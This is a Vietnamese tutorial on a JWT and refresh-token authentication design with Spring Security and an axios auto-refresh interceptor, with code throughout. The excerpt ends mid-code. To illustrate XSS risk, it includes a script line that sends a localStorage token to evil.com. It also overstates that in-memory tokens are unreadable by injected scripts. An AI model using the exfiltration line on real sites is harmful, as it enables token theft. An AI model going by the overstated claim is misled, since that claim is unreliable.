# 🔐 GIẢI THÍCH CHI TIẾT HỆ THỐNG XÁC THỰC VÀ PHÂN QUYỀN

## 🎯 **TỔNG QUAN**

Hệ thống xác thực và phân quyền sử dụng **kiến trúc 2-token**:
- **Access Token (JWT)** - Ngắn hạn (1 ngày), lưu trong memory
- **Refresh Token** - Dài hạn (7-30 ngày), HttpOnly cookie

**Các tính năng bảo mật:**
- ✅ Token rotation (refresh token tự động đổi mới)
- ✅ Token family (chống token reuse attack)
- ✅ HttpOnly cookies (chống XSS)
- ✅ Automatic token refresh (không cần đăng nhập lại)
- ✅ OAuth2 Google Login
- ✅ Role-based authorization (USER, ADMIN)

---

## 📋 **PHẦN 1: KIẾN TRÚC 2-TOKEN**

### **1.1. Access Token (JWT)**

**Đặc điểm:**
- **Thời hạn:** Ngắn (1 ngày = 86,400,000ms)
- **Lưu trữ:** Trong memory (JavaScript variable)
- **Mục đích:** Gửi kèm mỗi request để xác thực
- **Format:** JWT (JSON Web Token)

**Cấu trúc JWT:**
```
Header.Payload.Signature

Header: { "alg": "HS256", "typ": "JWT" }
Payload: { "sub": "username", "iat": 1234567890, "exp": 1234654290 }
Signature: HMAC-SHA256(header + payload, secret)
```

**Ví dụ:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJzdWIiOiJ1c2VybmFtZSIsImlhdCI6MTYwOTQ4MjQwMCwiZXhwIjoxNjA5NTY4ODAwfQ.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

**Tại sao ngắn hạn?**
- ✅ Giảm thiểu thiệt hại nếu bị đánh cắp
- ✅ Token hết hạn nhanh, phải refresh thường xuyên
- ✅ Dễ revoke (chỉ cần không refresh)

---

### **1.2. Refresh Token**

**Đặc điểm:**
- **Thời hạn:** Dài (7-30 ngày)
- **Lưu trữ:** HttpOnly cookie (không thể truy cập từ JavaScript)
- **Mục đích:** Dùng để lấy Access Token mới
- **Format:** UUID (random string)
- **Lưu trong DB:** Hashed (SHA-256)

**Tại sao HttpOnly Cookie?**
- ✅ **Chống XSS:** JavaScript không thể đọc được
- ✅ **Tự động gửi:** Browser tự động gửi kèm request
- ✅ **Secure:** Chỉ gửi qua HTTPS (nếu config)

---

## 🔄 **PHẦN 2: LUỒNG XÁC THỰC**

### **2.1. Đăng nhập (Login)**

```
┌─────────────────────────────────────────────────────────┐
│  1. USER NHẬP USERNAME/PASSWORD                         │
└─────────────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────────────┐
│  2. Frontend gửi POST /api/auth/signin                  │
│     { username: "user", password: "pass" }              │
└─────────────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────────────┐
│  3. Backend (AuthController.signin())                   │
│     - AuthenticationManager.authenticate()              │
│     - Kiểm tra username/password                        │
└─────────────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────────────┐
│  4. Tạo Access Token (JWT)                              │
│     - JwtUtil.generateJwtToken()                        │
│     - Chứa username, iat, exp                           │
└─────────────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────────────┐
│  5. Tạo Refresh Token                                   │
│     - RefreshTokenService.createRefreshToken()          │
│     - UUID.randomUUID() → Hash (SHA-256)                │
│     - Lưu vào database (hashed)                         │
│     - Token family: "family-{uuid}"                     │
└─────────────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────────────┐
│  6. Response:                                           │
│     - Body: { token: "JWT_ACCESS_TOKEN", user: {...} }  │
│     - Header: Set-Cookie: refreshToken=xxx (HttpOnly)   │
└─────────────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────────────┐
│  7. Frontend:                                           │
│     - Lưu Access Token vào memory (inMemoryAccessToken) │
│     - Refresh Token tự động lưu trong cookie            │
└─────────────────────────────────────────────────────────┘
```

**Code Backend:**

```java
@PostMapping("/signin")
public ResponseEntity<?> authenticateUser(@Valid @RequestBody LoginRequest loginRequest) {
    // 1. Xác thực username/password
    Authentication authentication = authenticationManager.authenticate(
        new UsernamePasswordAuthenticationToken(
            loginRequest.getUsername(),
            loginRequest.getPassword()
        )
    );
    
    // 2. Lấy thông tin user
    UserPrincipal userPrincipal = (UserPrincipal) authentication.getPrincipal();
    User user = userRepository.findById(userPrincipal.getId()).orElseThrow();
    
    // 3. Tạo Access Token
    String jwt = jwtUtil.generateJwtToken(authentication);
    
    // 4. Tạo Refresh Token
    String rawRefreshToken = refreshTokenService.createRefreshToken(user);
    
    // 5. Tạo HttpOnly Cookie
    ResponseCookie refreshCookie = cookieUtil.createRefreshCookie(rawRefreshToken);
    
    // 6. Response
    return ResponseEntity.ok()
        .header(HttpHeaders.SET_COOKIE, refreshCookie.toString())
        .body(JwtResponse.build(jwt, user));
}
```

---

### **2.2. Refresh Token (Lấy Access Token mới)**

```
┌─────────────────────────────────────────────────────────┐
│  1. Access Token hết hạn (401 Unauthorized)             │
└─────────────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────────────┐
│  2. Frontend (api.js interceptor)                       │
│     - Phát hiện 401                                     │
│     - Gọi POST /api/auth/refresh                        │
│     - Cookie tự động gửi kèm (HttpOnly)                 │
└─────────────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────────────┐
│  3. Backend (AuthController.refresh())                  │
│     - Lấy Refresh Token từ cookie                       │
│     - RefreshTokenService.exchangRefreshToken()         │
└─────────────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────────────┐
│  4. RefreshTokenService.exchangRefreshToken()           │
│     a. Hash Refresh Token                               │
│     b. Tìm trong database (hashed)                      │
│     c. Kiểm tra:                                        │
│        - Token có tồn tại?                              │
│        - Token đã bị revoked?                           │
│        - Token đã hết hạn?                              │
│     d. REVOKE token cũ (set revoked = true)             │
│     e. TẠO Refresh Token MỚI (rotation)                 │
│        - Token family giữ nguyên                        │
│        - Lưu vào database                               │
└─────────────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────────────┐
│  5. Tạo Access Token MỚI                                │
│     - JwtUtil.generateTokenFromUsername()               │
└─────────────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────────────┐
│  6. Response:                                           │
│     - Body: { accessToken: "NEW_JWT_TOKEN" }            │
│     - Header: Set-Cookie: refreshToken=NEW_TOKEN        │
│                (HttpOnly)                                │
└─────────────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────────────┐
│  7. Frontend:                                           │
│     - Lưu Access Token mới vào memory                   │
│     - Retry request gốc với token mới                   │
└─────────────────────────────────────────────────────────┘
```

**Code Backend:**

```java
@PostMapping("/refresh")
public ResponseEntity<?> refreshToken(
    @CookieValue(name = "${app.refreshCookieName}") String oldRawToken) {
    
    // 1. Exchange Refresh Token (rotation)
    ExchangeTokenResponse response = refreshTokenService.exchangRefreshToken(oldRawToken);
    String newRawRefreshToken = response.getNewRawRefreshToken();
    User user = response.getUser();
    
    // 2. Tạo Access Token mới
    String newAccessToken = jwtUtil.generateTokenFromUsername(user.getUsername());
    
    // 3. Tạo cookie mới
    ResponseCookie newRefreshCookie = cookieUtil.createRefreshCookie(newRawRefreshToken);
    
    // 4. Response
    return ResponseEntity.ok()
        .header(HttpHeaders.SET_COOKIE, newRefreshCookie.toString())
        .body(Map.of("accessToken", newAccessToken));
}
```

---

### **2.3. Token Rotation (Quay vòng token)**

**Vấn đề không dùng rotation:**
```
User đăng nhập → Refresh Token: "ABC123"
User refresh → Vẫn dùng "ABC123"
Nếu token bị đánh cắp → Hacker có thể dùng mãi mãi!
```

**Giải pháp với rotation:**
```
User đăng nhập → Refresh Token: "ABC123" (Family: "family-1")
User refresh → 
  - Revoke "ABC123" (set revoked = true)
  - Tạo token MỚI: "XYZ789" (Family: "family-1" - giữ nguyên)
  - Trả về "XYZ789"
  
Nếu token bị đánh cắp:
  - Hacker dùng "ABC123" → Phát hiện đã revoked
  - Revoke CẢ FAMILY (chống reuse attack)
```

**Code:**

```java
@Transactional
public ExchangeTokenResponse exchangRefreshToken(String oldRawToken) {
    // 1. Hash token cũ
    String oldHashToken = hashToken(oldRawToken);
    
    // 2. Tìm token trong database
    Optional<RefreshToken> rf = refreshTokenRepository
        .findByTokenHashAndRevokedFalse(oldHashToken);
    
    if (rf.isEmpty()) {
        // Token không tồn tại hoặc đã revoked
        Optional<RefreshToken> revokedToken = 
            refreshTokenRepository.findByTokenHash(oldHashToken);
        
        if (revokedToken.isPresent() && revokedToken.get().isRevoked()) {
            // PHÁT HIỆN TOKEN REUSE!
            // Revoke cả family (tất cả tokens cùng family)
            refreshTokenRepository.revokeTokenFamily(
                revokedToken.get().getTokenFamily()
            );
            throw new SecurityException("Phát hiện tái sử dụng Refresh Token!");
        }
        throw new SecurityException("Refresh Token không hợp lệ!");
    }
    
    RefreshToken oldToken = rf.get();
    
    // 3. Kiểm tra hết hạn
    if (oldToken.getExpiresAt().isBefore(LocalDateTime.now())) {
        oldToken.setRevoked(true);
        refreshTokenRepository.save(oldToken);
        throw new SecurityException("Refresh Token đã hết hạn!");
    }
    
    // 4. REVOKE token cũ
    oldToken.setRevoked(true);
    refreshTokenRepository.save(oldToken);
    
    // 5. TẠO TOKEN MỚI (cùng family)
    String newRawToken = generateNewToken(
        oldToken.getUser(), 
        oldToken.getTokenFamily()  // Giữ nguyên family
    );
    
    return new ExchangeTokenResponse(newRawToken, oldToken.getUser());
}
```

---

### **2.4. Token Family (Chống Reuse Attack)**

**Vấn đề:**
- Hacker đánh cắp Refresh Token
- Hacker và User cùng dùng token
- Server phát hiện: Token được dùng 2 lần → **TOKEN REUSE!**

**Giải pháp Token Family:**
```
User đăng nhập:
  - Refresh Token: "ABC123"
  - Family: "family-uuid-1"

User refresh:
  - Revoke "ABC123"
  - Tạo mới: "XYZ789"
  - Family: "family-uuid-1" (giữ nguyên)

Nếu hacker dùng "ABC123" (đã revoked):
  - Phát hiện: Token đã revoked
  - Revoke CẢ FAMILY "family-uuid-1"
  - Tất cả tokens cùng family bị revoked
  - User phải đăng nhập lại
```

**Code:**

```java
// Khi tạo token mới
private String generateNewToken(User user, String tokenFamily) {
    String rawToken = UUID.randomUUID().toString();
    String tokenHash = hashToken(rawToken);
    
    RefreshToken newToken = new RefreshToken();
    newToken.setUser(user);
    newToken.setTokenHash(tokenHash);
    newToken.setTokenFamily(tokenFamily);  // ← Giữ nguyên family
    newToken.setExpiresAt(LocalDateTime.now().plusNanos(refreshExpirationMs * 1_000_000L));
    newToken.setRevoked(false);
    newToken.setCreatedAt(LocalDateTime.now());
    
    refreshTokenRepository.save(newToken);
    return rawToken;
}

// Khi phát hiện reuse
if (revokedToken.isPresent() && revokedToken.get().isRevoked()) {
    // Revoke cả family
    refreshTokenRepository.revokeTokenFamily(
        revokedToken.get().getTokenFamily()
    );
    throw new SecurityException("Phát hiện tái sử dụng Refresh Token!");
}
```

---

## 🛡️ **PHẦN 3: JWT AUTHENTICATION FILTER**

### **3.1. Spring Security Filter Chain**

```
Request → Filter 1 → Filter 2 → ... → JwtAuthenticationFilter → Controller
```

**JwtAuthenticationFilter** được thêm vào filter chain:

```java
@Bean
public SecurityFilterChain securityFilterChain(HttpSecurity http) {
    // ... config khác
    
    // Thêm JWT filter TRƯỚC UsernamePasswordAuthenticationFilter
    http.addFilterBefore(
        jwtAuthenticationFilter, 
        UsernamePasswordAuthenticationFilter.class
    );
    
    return http.build();
}
```

---

### **3.2. JwtAuthenticationFilter Logic**

```java
@Component
public class JwtAuthenticationFilter extends OncePerRequestFilter {
    
    @Autowired
    private JwtUtil jwtUtil;
    
    @Autowired
    private UserDetailServiceImpl userDetailsService;
    
    @Override
    protected void doFilterInternal(
        HttpServletRequest request, 
        HttpServletResponse response, 
        FilterChain filterChain
    ) throws ServletException, IOException {
        
        try {
            // 1. Parse JWT từ header "Authorization: Bearer {token}"
            String jwt = parseJwt(request);
            
            // 2. Validate JWT
            if (jwt != null && jwtUtil.validationJwtToken(jwt)) {
                // 3. Lấy username từ JWT
                String username = jwtUtil.getUserNameFromToken(jwt);
                
                // 4. Load user details từ database
                UserDetails userDetails = userDetailsService.loadUserByUsername(username);
                
                // 5. Tạo Authentication object
                UsernamePasswordAuthenticationToken authentication =
                    new UsernamePasswordAuthenticationToken(
                        userDetails, 
                        null, 
                        userDetails.getAuthorities()  // ROLE_USER, ROLE_ADMIN
                    );
                
                // 6. Set vào SecurityContext
                SecurityContextHolder.getContext().setAuthentication(authentication);
            }
        } catch (Exception e) {
            System.err.println("Cannot set user authentication: " + e.getMessage());
        }
        
        // 7. Tiếp tục filter chain
        filterChain.doFilter(request, response);
    }
    
    private String parseJwt(HttpServletRequest request) {
        String header = request.getHeader("Authorization");
        if (StringUtils.hasText(header) && header.startsWith("Bearer ")) {
            return header.substring(7);  // Bỏ "Bearer "
        }
        return null;
    }
}
```

**Luồng hoạt động:**
1. Request đến → JwtAuthenticationFilter chặn
2. Parse JWT từ header `Authorization: Bearer {token}`
3. Validate JWT (signature, expiration)
4. Lấy username từ JWT payload
5. Load user từ database
6. Set Authentication vào SecurityContext
7. Controller có thể dùng: `SecurityContextHolder.getContext().getAuthentication()`

---

## 🔒 **PHẦN 4: PHÂN QUYỀN (AUTHORIZATION)**

### **4.1. Role-based Access Control**

**User Entity:**

```java
public enum UserRole {
    ADMIN,      // Quản trị viên
    USER        // Người dùng thường
}

public enum UserStatus {
    ACTIVE,     // Tài khoản hoạt động
    INACTIVE    // Tài khoản bị khóa
}
```

**UserPrincipal:**

```java
public class UserPrincipal implements UserDetails {
    private Long id;
    private String username;
    private Collection<? extends GrantedAuthority> authorities;
    
    public static UserPrincipal create(User user) {
        List<GrantedAuthority> authorities = List.of(
            new SimpleGrantedAuthority("ROLE_" + user.getRole().name())
            // ROLE_ADMIN hoặc ROLE_USER
        );
        return new UserPrincipal(...);
    }
    
    @Override
    public boolean isEnabled() {
        return status == User.UserStatus.ACTIVE;
    }
}
```

---

### **4.2. SecurityConfig - URL Authorization**

```java
@Bean
public SecurityFilterChain securityFilterChain(HttpSecurity http) {
    http.authorizeHttpRequests(auth ->
        auth
            // Public endpoints
            .requestMatchers("/api/auth/**").permitAll()
            .requestMatchers("/api/oauth2/**").permitAll()
            .requestMatchers(HttpMethod.GET, "/api/news/**").permitAll()
            
            // User endpoints
            .requestMatchers(HttpMethod.POST, "/api/news/create").hasRole("USER")
            .requestMatchers("/api/news/my-news/**").authenticated()
            
            // Admin endpoints
            .requestMatchers("/api/admin/**").hasRole("ADMIN")
            
            // Tất cả request khác cần authenticated
            .anyRequest().authenticated()
    );
    
    return http.build();
}
```

**Giải thích:**
- `.permitAll()` - Không cần authentication
- `.authenticated()` - Cần authentication (bất kỳ role nào)
- `.hasRole("USER")` - Cần role USER
- `.hasRole("ADMIN")` - Cần role ADMIN

---

### **4.3. Method-level Security**

```java
@PreAuthorize("hasRole('ADMIN')")
@PostMapping("/admin/users")
public ResponseEntity<?> createUser(...) {
    // Chỉ ADMIN mới được gọi
}
```

---

## 🔄 **PHẦN 5: AUTOMATIC TOKEN REFRESH (FRONTEND)**

### **5.1. InMemoryAccessToken - Lưu Token Trong Bộ Nhớ**

#### **5.1.1. Khái Niệm "In-Memory"**

**InMemoryAccessToken** là một biến JavaScript thông thường được khai báo ở module scope (ngoài component), lưu trữ Access Token trong RAM của trình duyệt.

```javascript
// api.js - File này được import một lần khi app khởi động
let inMemoryAccessToken = null;  // ← Biến này tồn tại trong RAM

// Hàm để set token (được gọi từ AuthContext)
export const setAccessToken = (token) => {
    inMemoryAccessToken = token;  // Gán giá trị vào biến
};

// Hàm để get token (dùng cho WebSocket)
export const getAccessToken = () => {
    return inMemoryAccessToken;  // Đọc giá trị từ biến
};
```

**Đặc điểm:**
- ✅ **Tồn tại trong RAM:** Chỉ tồn tại khi JavaScript đang chạy
- ✅ **Module-level variable:** Không phải state của React component
- ✅ **Chia sẻ toàn cục:** Tất cả các file import `api.js` đều truy cập cùng một biến
- ✅ **Tự động mất khi refresh:** Khi user refresh trang, JavaScript reload → biến reset về `null`

---

#### **5.1.2. So Sánh: Memory vs localStorage**

| Đặc điểm | In-Memory | localStorage |
|----------|-----------|--------------|
| **Vị trí lưu** | RAM (JavaScript variable) | Disk (Browser storage) |
| **Truy cập** | Chỉ từ JavaScript trong cùng origin | Có thể truy cập từ DevTools, extensions |
| **XSS Attack** | ❌ Không thể đọc được (biến private) | ⚠️ Có thể bị đọc nếu có XSS |
| **Khi refresh trang** | ✅ Tự động mất (reset về null) | ❌ Vẫn còn (phải xóa thủ công) |
| **Lifetime** | Chỉ khi tab đang mở | Vĩnh viễn (cho đến khi xóa) |
| **Performance** | ✅ Cực nhanh (RAM) | ⚠️ Chậm hơn (I/O disk) |

**Ví dụ minh họa:**

```javascript
// ❌ CÁCH CŨ (KHÔNG AN TOÀN) - localStorage
localStorage.setItem('token', 'abc123');
// Vấn đề:
// - Có thể bị XSS: <script>alert(localStorage.getItem('token'))</script>
// - Vẫn còn sau khi refresh → phải check và xóa thủ công
// - Có thể xem trong DevTools → Application → Local Storage

// ✅ CÁCH MỚI (AN TOÀN) - In-Memory
let inMemoryAccessToken = 'abc123';
// Ưu điểm:
// - XSS không thể đọc được (biến private trong module)
// - Tự động mất khi refresh → buộc phải refresh token
// - Không thể xem trong DevTools (không có trong storage)
```

---

#### **5.1.3. Vòng Đời Của InMemoryAccessToken**

```
┌─────────────────────────────────────────────────────────┐
│  1. APP KHỞI ĐỘNG                                       │
│     - File api.js được import                           │
│     - inMemoryAccessToken = null (mặc định)             │
└─────────────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────────────┐
│  2. USER ĐĂNG NHẬP                                      │
│     - AuthContext.login() nhận token từ backend         │
│     - Gọi setAccessToken(token)                         │
│     - inMemoryAccessToken = "JWT_TOKEN_ABC123"          │
└─────────────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────────────┐
│  3. SỬ DỤNG TOKEN                                       │
│     - Mỗi request → interceptor đọc inMemoryAccessToken │
│     - Thêm vào header: Authorization: Bearer {token}    │
│     - Token vẫn còn trong memory                        │
└─────────────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────────────┐
│  4. TOKEN HẾT HẠN (401)                                 │
│     - Interceptor phát hiện 401                         │
│     - Gọi /refresh → nhận token mới                     │
│     - setAccessToken(newToken) → CẬP NHẬT token mới     │
│     - inMemoryAccessToken = "JWT_TOKEN_XYZ789"          │
└─────────────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────────────┐
│  5. USER REFRESH TRANG                                  │
│     - JavaScript reload                                 │
│     - api.js được import lại                            │
│     - inMemoryAccessToken = null (RESET)                │
│     - AuthContext.checkAuthStatus() gọi /refresh        │
│     - Nhận token mới → setAccessToken()                 │
└─────────────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────────────┐
│  6. USER ĐĂNG XUẤT                                      │
│     - AuthContext.logout()                              │
│     - setAccessToken(null)                              │
│     - inMemoryAccessToken = null                        │
└─────────────────────────────────────────────────────────┘
```

---

#### **5.1.4. Request Interceptor - Tự Động Gắn Token**

```javascript
// api.js
const api = axios.create({
    baseURL: "/api",
    withCredentials: true,  // Quan trọng: để gửi HttpOnly cookie
});

// Request interceptor - Chạy TRƯỚC mỗi request
api.interceptors.request.use((config) => {
    // Đọc token từ memory (không phải localStorage)
    if (inMemoryAccessToken) {
        config.headers.Authorization = `Bearer ${inMemoryAccessToken}`;
    }
    return config;
});
```

**Luồng hoạt động:**
1. Component gọi API: `newsAPI.getMyNews()`
2. Axios interceptor chặn request
3. Kiểm tra `inMemoryAccessToken` có giá trị không
4. Nếu có → thêm header `Authorization: Bearer {token}`
5. Gửi request đến server

**Ví dụ thực tế:**
```javascript
// Component gọi API
const response = await newsAPI.getMyNews();

// Điều gì xảy ra:
// 1. newsAPI.getMyNews() → api.get("/news/my-news")
// 2. Interceptor chạy:
//    - Đọc inMemoryAccessToken = "eyJhbGciOiJIUzI1NiIs..."
//    - Thêm header: Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
// 3. Request được gửi với header đầy đủ
```

---

#### **5.1.5. Tại Sao Không Dùng localStorage?**

**Vấn đề với localStorage:**

1. **XSS Attack:**
```javascript
// Hacker inject script vào trang
<script>
    // Có thể đọc token từ localStorage
    const token = localStorage.getItem('token');
    // Gửi token đến server của hacker
    fetch('https://evil.com/steal?token=' + token);
</script>
```

2. **Vẫn còn sau refresh:**
```javascript
// User đăng nhập → token lưu vào localStorage
localStorage.setItem('token', 'abc123');

// User refresh trang
// → Token vẫn còn trong localStorage
// → Phải check token có hợp lệ không
// → Nếu hết hạn, phải refresh → phức tạp
```

3. **Có thể xem trong DevTools:**
- Mở DevTools → Application → Local Storage
- Token hiển thị rõ ràng → không an toàn

**Giải pháp với In-Memory:**

1. **Chống XSS:**
```javascript
// Biến inMemoryAccessToken là private trong module
// XSS script không thể truy cập được
// <script>alert(inMemoryAccessToken)</script> → undefined
```

2. **Tự động reset khi refresh:**
```javascript
// User refresh trang
// → JavaScript reload
// → inMemoryAccessToken = null (tự động)
// → AuthContext.checkAuthStatus() gọi /refresh
// → Nhận token mới → setAccessToken()
// → Luôn có token mới, không cần check cũ
```

3. **Không thể xem trong DevTools:**
- Token chỉ tồn tại trong RAM
- Không có trong Application → Local Storage
- An toàn hơn

---

#### **5.1.6. Khi Nào Token Được Set?**

**Các trường hợp set token:**

1. **Khi đăng nhập:**
```javascript
// AuthContext.js
const login = async (credentials) => {
    const response = await newsAPI.login(credentials);
    const { token } = response.data;
    
    setAccessToken(token);  // ← Set token vào memory
    setUser(userData);
};
```

2. **Khi refresh token (tự động):**
```javascript
// api.js - Response interceptor
const rs = await api.post('/auth/refresh');
const { accessToken } = rs.data;
setAccessToken(accessToken);  // ← Cập nhật token mới
```

3. **Khi app khởi động:**
```javascript
// AuthContext.js
const checkAuthStatus = async () => {
    const response = await newsAPI.refreshToken();
    const { accessToken } = response.data;
    setAccessToken(accessToken);  // ← Set token sau khi refresh
};
```

4. **Khi OAuth2 login:**
```javascript
// AuthContext.js
const oauth2Login = async (token, userData) => {
    setAccessToken(token);  // ← Set token từ OAuth2
};
```

5. **Khi đăng xuất:**
```javascript
// AuthContext.js
const logout = async () => {
    await newsAPI.logout();
    setAccessToken(null);  // ← Xóa token (set về null)
};
```

---

#### **5.1.7. Code Hoàn Chỉnh**

```javascript
// api.js
import axios from "axios";

const api = axios.create({
    baseURL: "/api",
    withCredentials: true,  // Gửi HttpOnly cookie
});

// ============================================
// IN-MEMORY ACCESS TOKEN
// ============================================

// Biến lưu token trong RAM (module-level)
let inMemoryAccessToken = null;

// Hàm để set token (export để AuthContext dùng)
export const setAccessToken = (token) => {
    inMemoryAccessToken = token;
    console.log('Token đã được lưu vào memory:', token ? 'Có' : 'Không');
};

// Hàm để get token (export để WebSocket dùng)
export const getAccessToken = () => {
    return inMemoryAccessToken;
};

// ============================================
// REQUEST INTERCEPTOR
// ============================================

api.interceptors.request.use(
    (config) => {
        // Mỗi request, tự động thêm token vào header
        if (inMemoryAccessToken) {
            config.headers.Authorization = `Bearer ${inMemoryAccessToken}`;
        }
        return config;
    },
    (error) => Promise.reject(error)
);

// ============================================
// RESPONSE INTERCEPTOR (Auto Refresh)
// ============================================

let isRefreshing = false;
let failedQueue = [];

const processQueue = (error, token = null) => {
    failedQueue.forEach(prom => {
        if (error) {
            prom.reject(error);
        } else {
            prom.resolve(token);
        }
    });
    failedQueue = [];
};

api.interceptors.response.use(
    (response) => response,
    async (error) => {
        const originalRequest = error.config;
        
        // Chỉ xử lý 401 và chưa retry
        if (error.response?.status === 401 && !originalRequest._retry) {
            
            if (isRefreshing) {
                // Đưa vào hàng đợi
                return new Promise((resolve, reject) => {
                    failedQueue.push({ resolve, reject });
                }).then(token => {
                    originalRequest.headers.Authorization = 'Bearer ' + token;
                    return api(originalRequest);
                });
            }
            
            originalRequest._retry = true;
            isRefreshing = true;
            
            try {
                // Gọi /refresh (cookie tự động gửi kèm)
                const rs = await api.post('/auth/refresh');
                const { accessToken } = rs.data;
                
                // CẬP NHẬT TOKEN MỚI VÀO MEMORY
                setAccessToken(accessToken);
                
                // Cập nhật header cho request gốc và queue
                originalRequest.headers.Authorization = 'Bearer ' + accessToken;
                processQueue(null, accessToken);
                
                isRefreshing = false;
                return api(originalRequest);  // Retry
                
            } catch (_error) {
                // Refresh thất bại → Xóa token
                isRefreshing = false;
                processQueue(_error, null);
                setAccessToken(null);  // ← Xóa token khỏi memory
                window.dispatchEvent(new Event("auth-failed"));
                return Promise.reject(_error);
            }
        }
        
        return Promise.reject(error);
    }
);
```

---

#### **5.1.8. Tóm Tắt: InMemoryAccessToken**

**Ưu điểm:**
- ✅ **An toàn:** Chống XSS, không thể đọc từ script khác
- ✅ **Tự động reset:** Mất khi refresh trang → buộc phải refresh token
- ✅ **Nhanh:** Truy cập từ RAM, không cần I/O disk
- ✅ **Private:** Không thể xem trong DevTools

**Nhược điểm:**
- ⚠️ **Mất khi refresh:** Phải gọi `/refresh` mỗi lần app khởi động
- ⚠️ **Không persist:** Không lưu vĩnh viễn (nhưng đây là tính năng, không phải bug)

**Kết luận:**
- InMemoryAccessToken phù hợp với kiến trúc 2-token (Access Token ngắn hạn + Refresh Token dài hạn)
- Refresh Token (HttpOnly cookie) đảm bảo user không cần đăng nhập lại
- Access Token (In-Memory) đảm bảo an toàn và tự động refresh

---

### **5.2. Response Interceptor - Auto Refresh Token**

#### **5.2.1. Tại Sao Cần Auto Refresh?**

**Vấn đề:**
- Access Token có thời hạn ngắn (1 ngày)
- Khi token hết hạn, tất cả request sẽ bị 401 Unauthorized
- User không muốn phải đăng nhập lại mỗi khi token hết hạn

**Giải pháp:**
- Tự động phát hiện 401
- Tự động gọi `/refresh` để lấy token mới
- Tự động retry request gốc với token mới
- User không cảm nhận được việc refresh (seamless)

---

#### **5.2.2. Logic Xử Lý 401 Chi Tiết**

```javascript
// api.js
let isRefreshing = false;  // Flag: đang refresh hay chưa?
let failedQueue = [];      // Hàng đợi các request bị 401

// Hàm xử lý hàng đợi
const processQueue = (error, token = null) => {
    failedQueue.forEach(prom => {
        if (error) {
            prom.reject(error);  // Refresh thất bại → reject tất cả
        } else {
            prom.resolve(token); // Refresh thành công → resolve với token mới
        }
    });
    failedQueue = [];  // Xóa hàng đợi
};

// Response interceptor
api.interceptors.response.use(
    (response) => response,  // Nếu thành công, trả về bình thường
    async (error) => {
        const originalRequest = error.config;
        
        // CHỈ xử lý khi:
        // 1. Lỗi là 401 (Unauthorized)
        // 2. Request này chưa từng retry (tránh loop vô hạn)
        if (error.response?.status === 401 && !originalRequest._retry) {
            
            // ============================================
            // TRƯỜNG HỢP 1: Đang có request khác refresh
            // ============================================
            if (isRefreshing) {
                // Đưa request này vào hàng đợi
                return new Promise((resolve, reject) => {
                    failedQueue.push({ resolve, reject });
                }).then(token => {
                    // Khi refresh xong, retry với token mới
                    originalRequest.headers.Authorization = 'Bearer ' + token;
                    return api(originalRequest);
                });
            }
            
            // ============================================
            // TRƯỜNG HỢP 2: Chưa có request nào refresh
            // ============================================
            originalRequest._retry = true;  // Đánh dấu đã retry
            isRefreshing = true;            // Bắt đầu refresh
            
            try {
                // 1. Gọi API /refresh (cookie tự động gửi kèm)
                const rs = await api.post('/auth/refresh');
                const { accessToken } = rs.data;
                
                // 2. CẬP NHẬT TOKEN MỚI VÀO MEMORY
                setAccessToken(accessToken);
                
                // 3. Cập nhật header cho request gốc
                originalRequest.headers.Authorization = 'Bearer ' + accessToken;
                
                // 4. Giải quyết hàng đợi (nếu có request khác đang chờ)
                processQueue(null, accessToken);
                
                // 5. Reset flag
                isRefreshing = false;
                
                // 6. Retry request gốc với token mới
                return api(originalRequest);
                
            } catch (_error) {
                // ============================================
                // TRƯỜNG HỢP 3: Refresh thất bại
                // ============================================
                // (Refresh Token hết hạn hoặc bị revoked)
                
                isRefreshing = false;
                
                // Báo lỗi cho tất cả request trong hàng đợi
                processQueue(_error, null);
                
                // XÓA TOKEN KHỎI MEMORY
                setAccessToken(null);
                
                // Gửi event để AuthContext logout
                window.dispatchEvent(new Event("auth-failed"));
                
                return Promise.reject(_error);
            }
        }
        
        // Nếu không phải 401 hoặc đã retry rồi → trả về lỗi bình thường
        return Promise.reject(error);
    }
);
```

---

#### **5.2.3. Tại Sao Cần Queue (Hàng Đợi)?**

**Vấn đề:**
- Nhiều request có thể cùng lúc bị 401
- Nếu mỗi request đều gọi `/refresh` → nhiều request refresh không cần thiết
- Có thể gây race condition

**Giải pháp Queue:**
- Chỉ 1 request đầu tiên gọi `/refresh`
- Các request khác chờ trong queue
- Khi refresh xong, tất cả request trong queue retry với token mới

**Ví dụ minh họa:**

```
Thời điểm T0:
  - User click 3 button cùng lúc
  - Request 1: GET /api/news/my-news
  - Request 2: GET /api/notifications
  - Request 3: GET /api/profile

Thời điểm T1 (tất cả đều bị 401):
  - Request 1 → 401 → Bắt đầu refresh (isRefreshing = true)
  - Request 2 → 401 → Vào queue (chờ)
  - Request 3 → 401 → Vào queue (chờ)

Thời điểm T2 (refresh thành công):
  - Request 1: Retry với token mới ✅
  - Request 2: Lấy token từ queue → Retry ✅
  - Request 3: Lấy token từ queue → Retry ✅
  - isRefreshing = false
  - failedQueue = []
```

**Code minh họa queue:**

```javascript
// Request 1 (đầu tiên)
if (!isRefreshing) {
    isRefreshing = true;
    const newToken = await refresh();
    setAccessToken(newToken);
    processQueue(null, newToken);  // Giải quyết queue
}

// Request 2, 3 (sau đó)
if (isRefreshing) {
    // Đưa vào queue
    return new Promise((resolve, reject) => {
        failedQueue.push({ resolve, reject });
    }).then(token => {
